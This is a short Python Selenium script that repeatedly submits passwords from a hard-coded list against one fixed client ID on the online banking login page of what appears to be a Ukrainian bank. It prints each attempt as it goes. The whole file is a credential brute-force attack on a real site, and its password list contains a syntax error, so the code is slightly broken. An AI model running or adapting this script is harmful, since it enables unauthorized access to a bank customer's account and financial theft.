import random
from selenium import webdriver

#Following are optional required
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import Select
from selenium.common.exceptions import NoSuchElementException

baseurl = "https://www.kredodirect.com.ua/web"
l=['asdadsds','asdsdsaadsads1','sadcasd124'.'asdasd123142']

xpaths = { 'usernameTxtBox' : '//input[@id="client_id"]',
           'passwordTxtBox' : "//input[@id='password']",
           'submitButton' :   '//input[@title="OK"]',
           'back' : '//input[@name="mnu_service_end"]',

         }

mydriver = webdriver.Chrome()
mydriver.get(baseurl)
mydriver.maximize_window()



for el in l:
    try:
        mydriver.find_element_by_xpath(xpaths['usernameTxtBox']).is_displayed()

        mydriver.find_element_by_xpath(xpaths['usernameTxtBox']).send_keys(11095161)
        mydriver.find_element_by_xpath(xpaths['passwordTxtBox']).send_keys(el)
        print el
        mydriver.find_element_by_xpath(xpaths['submitButton']).click()
    except:

        mydriver.find_element_by_xpath(xpaths['back']).click()
        print el
